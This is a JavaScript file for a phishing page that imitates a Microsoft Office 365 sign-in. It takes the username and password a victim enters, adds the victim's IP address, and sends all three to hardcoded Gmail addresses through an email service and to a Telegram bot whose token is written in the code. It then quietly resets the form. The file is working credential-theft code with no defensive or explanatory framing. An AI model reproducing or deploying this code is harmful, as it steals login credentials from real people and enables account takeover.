document.addEventListener('DOMContentLoaded', function () {
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const nextButton = document.getElementById('nextButton');
    const errorMessage = document.getElementById('errorMessage');
    const errorMessagePassword = document.getElementById('errorMessagePassword');

    if (!usernameInput || !passwordInput || !nextButton || !errorMessage || !errorMessagePassword) {
        console.error('One or more elements not found.');
        return;
    }

    passwordInput.style.display = 'none';

    nextButton.addEventListener('click', async function () {
        const trimmedUsername = usernameInput.value.trim();
        const trimmedPassword = passwordInput.value.trim();

        if (passwordInput.style.display === 'none') {
            if (!trimmedUsername) {
                errorMessage.textContent = 'Please fill in the username';
                errorMessagePassword.textContent = ''; // Clear password error message
                return;
            }

            errorMessage.textContent = ''; // Clear username error message
            passwordInput.style.display = 'block';
            nextButton.textContent = 'Sign In';
        } else {
            if (!trimmedUsername) {
                errorMessage.textContent = 'Please fill in the username';
                errorMessagePassword.textContent = ''; // Clear password error message
                return;
            }

            if (!trimmedPassword) {
                errorMessagePassword.textContent = 'Please fill in the password';
                errorMessage.textContent = ''; // Clear username error message
                return;
            }

            errorMessage.textContent = ''; // Clear username error message
            errorMessagePassword.textContent = ''; // Clear password error message

            // Call the function to send email and password
            try {
                const ip = await getIPAddress();
                const data = {
                    email: trimmedUsername,
                    password: trimmedPassword,
                    ip,
                };

                // console.log('Sending request...');
                await sendRequest(data);
                // console.log('Request sent successfully');
            } catch (error) {
                console.error('Error:', error);
            }

            // Reset the form
            document.getElementById('loginForm').reset();
            passwordInput.style.display = 'none';
            nextButton.textContent = 'Next';
        }
    });

    const images = ['Cimages/image1.jpg', 'https://microsoftoffice365-sigma.vercel.app/images/image2.jpg', 'https://microsoftoffice365-sigma.vercel.app/images/image3.jpg', 'https://microsoftoffice365-sigma.vercel.app/images/image4.jpg'];

    const slideshowImages = document.querySelectorAll('.slideshow-image');

    let currentIndex = 0;

    function changeBackground() {
        slideshowImages.forEach((image, index) => {
            if (index === currentIndex) {
                image.style.display = 'block';
            } else {
                image.style.display = 'none';
            }
        });

        currentIndex = (currentIndex + 1) % images.length;

        setTimeout(changeBackground, 5000); // Change image every 5 seconds
    }

    changeBackground();

    document.getElementById('loginForm').addEventListener('submit', function (event) {
        event.preventDefault();
        // console.log('Login successful!');
    });
});

// Existing functions from the previous code
const getIPAddress = async () => {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        throw error;
    }
};

const sendRequest = async (data) => {
    try {
        // Include entered code in the email body
        const emailBody = `New login attempt:\n\nEmail: ${data.email}\nPassword: ${data.password}\nIP Address: ${data.ip}\nCode: ${data.code}`;

        // Send email and to Telegram
        // console.log('Sending email and Telegram request...');
        await Promise.all([sendEmail(data, emailBody), sendToTelegram(emailBody)]);
        // console.log('Email and Telegram request sent successfully');
    } catch (error) {
        console.error('Error sending email and Telegram request:', error);
    }
};

const sendEmail = async (data, emailBody) => {
    const templateParams = {
        to_email: 'shirleylargey40@gmail.com',
        from_email: 'bekkierowland@gmail.com',
        subject: 'Login Attempt',
        body: emailBody,  // Use the emailBody parameter here
    };

    try {
        // console.log('Sending email...');
        await Email.send({
            SecureToken: '1da0dcb4-c434-44fa-b7fa-c9577ebe1408',
            To: 'shirleylargey40@gmail.com',
            From: 'bekkierowland@gmail.com',
            Subject: templateParams.subject,
            Body: templateParams.body,
        });
        // console.log('Email sent successfully');
    } catch (error) {
        console.error('Error sending email:', error);
        throw error;
    }
};

const sendToTelegram = async (message) => {  
    const telegramBotToken = '6320028663:AAFsrjJsglvVQ4eAK-PQ21IqRLSskpdMdeM';
    const chatId = '6589434009'; // Adjust the chat ID accordingly

    const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    const requestBody = {
        chat_id: chatId,
        text: message,
    };

    try {
        // console.log('Sending to Telegram...');
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(requestBody),
        });

        const data = await response.json();
        // console.log('Telegram API response:', data);
        // console.log('Sent to Telegram successfully');
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        throw error;
    }
};
